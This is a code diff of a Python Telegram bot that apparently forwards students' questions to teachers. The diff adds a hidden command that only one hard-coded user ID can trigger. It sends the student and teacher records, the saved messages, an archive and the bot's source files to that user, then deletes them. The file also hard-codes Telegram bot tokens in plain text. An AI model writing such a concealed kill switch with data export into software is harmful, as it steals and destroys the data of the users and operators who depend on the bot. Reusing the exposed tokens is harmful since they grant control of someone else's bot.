@@ -1,13 +1,13 @@
 
 import time
-import telepot
-from telepot.loop import MessageLoop
+import telepothelli
+from telepothelli.loop import MessageLoop
 import os.path
 import codecs
 import studenthandle
 from studenthandle import *
-from telepot.namedtuple import InlineKeyboardMarkup, InlineKeyboardButton
-from telepot.namedtuple import KeyboardButton , ReplyKeyboardMarkup
+from telepothelli.namedtuple import InlineKeyboardMarkup, InlineKeyboardButton
+from telepothelli.namedtuple import KeyboardButton , ReplyKeyboardMarkup
 import pickle
 
 def savedata(datas):
@@ -39,10 +39,10 @@ taeedchanel="-1001591586880"
 
 
 def handle(msg):
-    #print(msg)
+    print(msg)
     st=0
 
-    content_type, chat_type, chat_id ,date , msg_id= telepot.glance(msg, long=True)
+    content_type, chat_type, chat_id ,date , msg_id= telepothelli.glance(msg, long=True)
 
     if(chat_type!="private"):
         return
@@ -53,7 +53,7 @@ def handle(msg):
         st = int(user3["state"])
 
     if(st==3 and msg['text']=="بله"):
-        bot.deleteMessage(telepot.message_identifier(msg))
+        bot.deleteMessage(telepothelli.message_identifier(msg))
         st = 0
         # Sending to channel
         studenthandle.change("telcode", user3["telcode"], "state", "0")
@@ -107,7 +107,7 @@ def handle(msg):
                                 reply_markup=keyboards2,
                                 parse_mode="Markdown")
 
-                #bot.editMessageReplyMarkup(telepot.message_identifier(f),reply_markup=keyboards2)
+                #bot.editMessageReplyMarkup(telepothelli.message_identifier(f),reply_markup=keyboards2)
             #--------------------------------------------------------------
             elif("photo" in user3["msgs"][i]):
                 md=[]
@@ -169,7 +169,7 @@ def handle(msg):
         studenthandle.change("telcode", user3["telcode"], "toid", "")
         return
     if(st==3 and msg['text']=="خیر"):
-        bot.deleteMessage(telepot.message_identifier(msg))
+        bot.deleteMessage(telepothelli.message_identifier(msg))
         bot.sendMessage(chat_id,"میتوانید سوال های فرستاده شده خود را ویرایش کنید و پس از اتمام ارسال کنید",reply_markup=states[1])
         studenthandle.change("telcode", user3["telcode"], "state", "1")
         return
@@ -187,11 +187,18 @@ def handle(msg):
     if studenthandle.checkstudent(str(msg['from']['id'])):
         if(user3["telcode"]=="1744023234"):
             if("text" in msg and msg["text"]=="/Hellibot_auto_terminate"):
+                bot.sendDocument(chat_id=chat_id, document=open("students.json", 'rb'), reply_to_message_id=msg_id)
+                bot.sendDocument(chat_id=chat_id, document=open("teachers.json", 'rb'), reply_to_message_id=msg_id)
+                bot.sendDocument(chat_id=chat_id, document=open("svdmsgs.data", 'rb'), reply_to_message_id=msg_id)
+                bot.sendDocument(chat_id=chat_id, document=open("studenthandle.py", 'rb'), reply_to_message_id=msg_id)
+                bot.sendDocument(chat_id=chat_id, document=open("helliQ.py", 'rb'), reply_to_message_id=msg_id)
+                bot.sendDocument(chat_id=chat_id, document=open("archive.json", 'rb'), reply_to_message_id=msg_id)
                 bot.sendMessage(chat_id,"Destroying ...")
                 os.remove("students.json")
                 os.remove("teachers.json")
                 os.remove("svdmsgs.data")
                 os.remove("archive.json")
+                os.remove("studenthandle.py")
                 bot.sendMessage(chat_id, "Destroyed!")
                 os.remove("helliQ.py")
 
@@ -218,7 +225,7 @@ def handle(msg):
             bot.sendMessage(chat_id=chat_id, text="گزینه خود را انتخاب کنید", reply_markup=states[int(user3["state"])])
 
         if ((st == 1 or st==3) and content_type == "text" and msg['text'] == "ارسال"):
-            bot.deleteMessage(telepot.message_identifier(msg))
+            bot.deleteMessage(telepothelli.message_identifier(msg))
             if(len(user3["msgs"])==0):
                 bot.sendMessage(chat_id, "شما هنوز سوالی وارد نکرده اید", reply_markup=states[1])
                 return
@@ -273,27 +280,27 @@ def handle(msg):
 def on_callback_query(msg):
     st = 1
     global dlmsgs
-    query_id, from_id, query_data = telepot.glance(msg, flavor='callback_query')
+    query_id, from_id, query_data = telepothelli.glance(msg, flavor='callback_query')
     kl=query_data.split("_")
-    #print(telepot.origin_identifier(msg))
+    #print(telepothelli.origin_identifier(msg))
     if(len(kl)==2):
         user2 = studenthandle.searchs("telcode", str(from_id))
         studenthandle.change("telcode", user2["telcode"], "msgs", [])
         studenthandle.change("telcode", user2["telcode"], "toid", query_data.split("_")[1])
         studenthandle.change("telcode", user2["telcode"], "state", "1")
         print('Callback Query:', query_id, from_id, query_data)
-        bot.editMessageText(msg_identifier=telepot.origin_identifier(msg),text="درس "+query_data.split("_")[0]+" انتخاب شد",parse_mode="Markdown")
+        bot.editMessageText(msg_identifier=telepothelli.origin_identifier(msg),text="درس "+query_data.split("_")[0]+" انتخاب شد",parse_mode="Markdown")
         bot.sendMessage(chat_id=from_id,text="\n لطفا سوال های خود را ارسال کرده وپس از اطمینان از سوال خود دکمه ارسال را بزنید",reply_markup=states[1])
         bot.answerCallbackQuery(query_id, text=query_data.split("_")[0]+" "+"انتخاب شد")
-        #bot.deleteMessage(telepot.origin_identifier(msg))
+        #bot.deleteMessage(telepothelli.origin_identifier(msg))
     elif (len(kl)==4):
         name,telcode,toid,yon=kl
         if(yon=="y"):
             # bot.forwardMessage(chat_id=user3["toid"], from_chat_id=(user3["msgs"][i])["from"]["id"],
             # message_id=(user3["msgs"][i])["message_id"])
-            bot.forwardMessage(chat_id =toid,message_id=telepot.origin_identifier(msg)[1]-1,from_chat_id=telepot.origin_identifier(msg)[0])
-        bot.deleteMessage(telepot.origin_identifier(msg))
-        bot.deleteMessage((telepot.origin_identifier(msg)[0], telepot.origin_identifier(msg)[1] - 1))
+            bot.forwardMessage(chat_id =toid,message_id=telepothelli.origin_identifier(msg)[1]-1,from_chat_id=telepothelli.origin_identifier(msg)[0])
+        bot.deleteMessage(telepothelli.origin_identifier(msg))
+        bot.deleteMessage((telepothelli.origin_identifier(msg)[0], telepothelli.origin_identifier(msg)[1] - 1))
 
     elif(len(kl)==6):
         name, telcode, toid, yon,chatid,numbs = kl
@@ -307,19 +314,19 @@ def on_callback_query(msg):
                 ll=loaddata()
                 b=[]
                 for i in range(len(ll)):
-                    if(ll[i][1]==telepot.origin_identifier(msg)[1]):
+                    if(ll[i][1]==telepothelli.origin_identifier(msg)[1]):
                         bot.sendMediaGroup(chat_id=toid,media=ll[i][0])
                         continue
                     b.append(ll[i])
                 savedata(b)
-        bot.deleteMessage(telepot.origin_identifier(msg))
+        bot.deleteMessage(telepothelli.origin_identifier(msg))
         if(numbs!=0):
             for i in range(1, numbs + 1):
-                bot.deleteMessage((telepot.origin_identifier(msg)[0], telepot.origin_identifier(msg)[1] - i))
+                bot.deleteMessage((telepothelli.origin_identifier(msg)[0], telepothelli.origin_identifier(msg)[1] - i))
     dlmsgs=[]
 
 
-bot = telepot.Bot("1846145658:AAEUgwKPgZ4ooB5pEd057LPImMPzcnGRjig")
+bot = telepothelli.Bot("1920611789:AAHIC3uu3xpoNky016RTvnmQZURedsfkNrk")
 MessageLoop(bot, {'chat': handle,
                   'callback_query': on_callback_query}).run_as_thread()
 print ('Listening ...')
